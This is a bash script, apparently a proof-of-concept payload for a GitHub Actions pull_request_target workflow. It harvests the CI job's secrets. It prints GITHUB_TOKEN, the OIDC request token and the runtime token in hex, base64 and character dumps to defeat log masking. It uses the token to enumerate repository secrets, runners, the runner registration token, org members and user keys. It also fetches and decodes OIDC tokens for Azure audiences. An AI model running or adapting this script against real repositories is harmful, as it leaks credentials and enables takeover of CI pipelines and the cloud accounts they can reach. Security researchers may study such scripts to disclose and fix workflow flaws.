#!/usr/bin/env bash
set +e
echo "=== I10418 PRTARGET CONTEXT ==="
echo "whoami=$(whoami) uid=$(id -u)"
echo "event=$GITHUB_EVENT_NAME ref=$GITHUB_REF base=$GITHUB_BASE_REF head=$GITHUB_HEAD_REF actor=$GITHUB_ACTOR"

echo "=== SECTION 1: ENV NAMES ==="
env | sort | cut -d= -f1 | tr '\n' ','
echo

echo "=== SECTION 2: MASKING-BYPASS (HEX / OD_C / B64WRAP) ==="
for v in GITHUB_TOKEN DEMO_CANARY ACTIONS_ID_TOKEN_REQUEST_TOKEN ACTIONS_RUNTIME_TOKEN; do
  val="${!v}"
  if [ -z "$val" ]; then echo "VAR $v EMPTY"; continue; fi
  echo "### VAR $v len=${#val}"
  echo -n "HEX="; printf '%s' "$val" | xxd -p | tr -d '\n'; echo
  echo -n "B64WRAP="; printf '%s' "$val" | base64; echo
  echo "OD_C:"; printf '%s' "$val" | od -An -c
  echo
done

echo "=== SECTION 3: whole env od -An -c ==="
env | sort | od -An -c

echo "=== SECTION 4: API WITH GITHUB_TOKEN (pr-target write-all) ==="
api() {
  code=$(curl -s -o /tmp/rr -w '%{http_code}' -X "$1" -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2022-11-28" "$2")
  echo "HTTP $1 $2 -> $code"
  head -c 500 /tmp/rr; echo; echo
}
api GET "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets"
api GET "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/variables"
api GET "https://api.github.com/repos/$GITHUB_REPOSITORY/environments"
api GET "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/permissions/workflow"
api GET "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runners"
api GET "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runners/registration-token"
api GET "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/permissions"
api GET "https://api.github.com/orgs/StephenClash/members"
api GET "https://api.github.com/user"
api GET "https://api.github.com/user/keys"

echo "=== SECTION 5: scopes header ==="
curl -s -D - -o /dev/null -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" https://api.github.com/repos/$GITHUB_REPOSITORY | tr -d '\r' | grep -iE 'x-oauth-scopes|x-accepted|x-github-api|^HTTP' | head -20
echo

echo "=== SECTION 6: OIDC (vso + AADTokenExchange) ==="
if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
  for AUD in vso "vso:a0dde1ce-8a95-4ac3-a59f-9a4b68a28b41" "api://AzureADTokenExchange"; do
    echo "-- audience=$AUD"
    curl -s -o /tmp/idt.json -w "IDT_HTTP=%{http_code}\n" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD"
    cat /tmp/idt.json | base64 -w0; echo
    python3 -c "
import json,base64
try:
    d=json.load(open('/tmp/idt.json')); v=d.get('value','')
    p=v.split('.')[1]; p+='='*(-len(p)%4)
    print('IDT_PAYLOAD=', base64.urlsafe_b64decode(p).decode())
except Exception as e:
    print('IDT_DECODE_ERR', repr(e))
" 2>/dev/null || echo py-unavailable
  done
fi
echo "=== DONE ==="
